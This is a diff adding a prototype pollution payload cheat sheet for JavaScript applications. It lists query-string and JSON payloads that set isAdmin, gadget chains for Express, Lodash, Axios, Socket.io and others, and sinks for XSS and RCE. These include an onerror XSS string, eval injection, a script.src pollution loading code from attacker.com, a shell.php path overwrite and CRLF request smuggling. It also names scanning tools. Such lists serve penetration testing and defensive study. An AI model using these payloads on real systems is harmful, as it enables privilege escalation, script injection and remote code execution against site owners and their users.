@@ -1,0 +1,124 @@
+# Prototype Pollution — Payloads & Gadgets
+# Sources: PayloadsAllTheThings, swisskyrepo, NetSPI, PortSwigger (2025-2026)
+# Categories: Client-Side, Server-Side, Gadgets, Sinks
+
+# ============================================================
+# SECTION 1: CLIENT-SIDE PROTOTYPE POLLUTION
+# ============================================================
+
+# --- URL-based (QS / search params) ---
+# Express/qs parser:
+?__proto__[isAdmin]=true
+?__proto__[polluted]=true
+?constructor[prototype][isAdmin]=true
+
+# --- JSON-based (if JSON parsed with vulnerable merge) ---
+# Input JSON:
+#   {"__proto__":{"isAdmin":true}}
+#   {"constructor":{"prototype":{"isAdmin":true}}}
+#   {"__proto__":{"polluted":"yes"}}
+
+# --- Keys that commonly work ---
+__proto__
+constructor.prototype
+prototype
+
+# ============================================================
+# SECTION 2: SERVER-SIDE PROTOTYPE POLLUTION
+# ============================================================
+
+# --- Express.js specific ---
+{"__proto__":{"parameterLimit":1}}  # Reduce parameter limit → DoS
+{"__proto__":{"ignoreQueryPrefix":true}}  # Allows ?? prefix queries
+{"__proto__":{"allowDots":true}}  # Allows dot notation in params: ?foo.bar=baz
+{"__proto__":{"plain":true}}
+
+# --- Lodash Merge ---
+# Vulnerable if application uses lodash.merge() or _.defaultsDeep()
+#   _.merge({}, JSON.parse(userInput))
+# Payload:
+#   {"__proto__":{"isAdmin":true}}
+
+# --- jQuery $.extend ---
+#   $.extend(true, {}, JSON.parse(userInput))
+# Payload:
+#   {"__proto__":{"isAdmin":true}}
+
+# --- Mongoose Schema ---
+#   Model.findOne({...})
+# Payload:
+#   {"__proto__":{"__proto__":{"constructor":{"prototype":{"$ne":""}}}}}
+
+# ============================================================
+# SECTION 3: GADGETS — JS Frmaework Specific
+# ============================================================
+
+# --- Express ---
+# Gadget chain:
+#   1. Pollute statusMessage (default "OK")
+#      {"__proto__":{"statusMessage":"XSS"}}
+#   2. Trigger error with status code
+#     Response contains polluted statusMessage
+
+# --- Lodash ---
+# Pollute prototype to change default behavior:
+#   {"__proto__":{"0":"injected"}}
+
+# --- Axios (CVE-2026-40175, CVE-2026-44490) ---
+# Prototype pollution in merge() → CRLF injection → request smuggling:
+#   {"__proto__":{"header":"value\r\nSmuggled-Request: /evil"}}
+# Affects: axios < 1.15.0, < 0.32.0
+
+# --- Dojo Toolkit ---
+#   {"__proto__":{"isAdmin":true}}
+
+# --- Socket.io ---
+#   {"__proto__":{"_placeholder":true,"num":0}}
+
+# --- Konva.js ---
+#   {"__proto__":{"0":"x"}}
+
+# ============================================================
+# SECTION 4: SINKS (what to pollute for XSS / RCE)
+# ============================================================
+
+# --- innerHTML (XSS via polluted property) ---
+# If code does: element.innerHTML = obj.someProp
+# Pollute: {"__proto__":{"someProp":"<img src=x onerror=alert(1)>"}}
+
+# --- Src/Action (XSS via polluted URL) ---
+# If code does: script.src = obj.url
+# Pollute: {"__proto__":{"url":"https://attacker.com/evil.js"}}
+
+# --- eval (RCE) ---
+# If code does: eval(obj.code)
+# Pollute: {"__proto__":{"code":"alert(1)"}}
+
+# --- defaults / options (behavior change) ---
+# If code uses: opts = Object.assign({}, defaults, userInput)
+# Pollute defaults to change behavior
+
+# ============================================================
+# SECTION 5: DETECTION PAYLOADS
+# ============================================================
+
+# --- Test if app is vulnerable (browser console) ---
+#   Object.prototype.polluted = "yes"
+#   var obj = {}
+#   obj.polluted === "yes"  // true if vulnerable
+
+# --- Beyond the browser (detect server-side) ---
+# Submit: {"__proto__":{"polluted":"trigger"}}
+# Check if response or subsequent behavior differs
+
+# --- Zip Slip via Prototype (Node.js) ---
+# When unzipping files, pollute path to overwrite files
+# {"__proto__":{"path":"/var/www/html/shell.php"}}
+
+# ============================================================
+# SECTION 6: TOOLS
+# ============================================================
+# pp-finder:           python3 pp-finder.py -u https://target.com
+# silent-spring:       Prototype Pollution to RCE in Node.js
+# PPScan:              msrkp/PPScan (client-side scanner)
+# Burp PP Ext:         PortSwigger Server-Side Prototype Pollution
